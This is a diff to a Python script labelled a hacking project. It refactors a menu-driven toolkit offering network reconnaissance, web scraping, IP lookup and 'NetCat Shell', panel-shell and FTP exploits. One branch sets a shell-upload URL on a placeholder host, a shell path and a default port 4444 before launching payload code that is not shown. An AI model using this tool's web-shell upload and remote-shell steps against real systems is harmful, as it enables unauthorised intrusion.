@@ -1,14 +1,15 @@
 # Programmer: Given Lepita
 # Project: Hacking
+import sys
 from time import sleep
-from exploits import NetworkIntelligence
-from exploits import ScraperInfo
-from exploits import IPLookUp
-from exploits import PayLoads
-from exploits import Ping
-from Webcrawler import WebCrawler
 from prettytable import PrettyTable
-
+from urllib.request import urlretrieve
+from src.exploits.network_info import NetworkIntelligence
+from src.exploits.ip_lookup import IPLookUp
+from src.exploits.ping import Ping
+from src.exploits.payloads import PayLoads
+from src.exploits.info_scraper import ScraperInfo
+from Webcrawler import WebCrawler
 
 TAB = "\t" * 2
 header = """
@@ -64,12 +65,10 @@ def main():
 [+] Source Code & HTTP(S) headers
 [+] Harvesting Comments
 [+] Links(Download Images)
-    """,
-    """
+    """, """
 [+] IP information(TABLE FORMAT)
 [+] Region , Coordiates and MORE!
-    """,
-    """
+    """, """
 [+] NetCat Shell (Remote Exploitation)
 [+] Panel Shell Exploit
 [+] FTP Exploit!
@@ -92,21 +91,21 @@ def main():
         print("Perfoming Network Intelligence On {}".format(newAgent))
         sleep(0.8)
         baseObject.network_mapper()
-        baseObject.robotsFile()
-        baseObject.whoIs()
+        baseObject.robots()
+        baseObject.whois_info()
 
     elif baseClass == 2:
         newAgent = input("Enter URL to perfom Scraping on:   ")
         baseObject = ScraperInfo(newAgent)
 
-        print("CAUTION: Make Sure You Have A Lot Of Bandwith And A Strong Signal")
+        print("CAUTION: Make Sure You Have GOOD Bandwith And A Strong Signal")
         sleep(0.8)
         print("\nPerforming  Web Scraping On {}".format(newAgent))
         sleep(0.2)
         baseObject.HTTP_headers()
         baseObject.sourceCode()
-        baseObject.HTTP_headers()
         baseObject.siteImages()
+        baseObject.commentHarvester()
 
     elif baseClass == 3:
         newAgent = input("Enter IP Address:   ")
@@ -122,7 +121,7 @@ def main():
     # No gaurantee it will run
     # I'll fix it when I have time.
     elif baseClass == 4:
-        urlUpload ="http://torct.whatever/upload.php"
+        urlUpload = "http://torct.whatever/upload.php"
         port = input("Enter PORT(default[4444]):   ")
         url = input("Enter URL:   ")
         shellDir = input("Input shell(/shell/shell.php):  ")
@@ -140,7 +139,7 @@ def main():
                     sock = baseObject.construction()
                     baseObject.await(sock)
                     baseObject.run()
-                elif port != None:
+                elif port is not None:
                     sock = baseObject.construction()
                     # baseObject.await(sock)
                     baseObject.run()
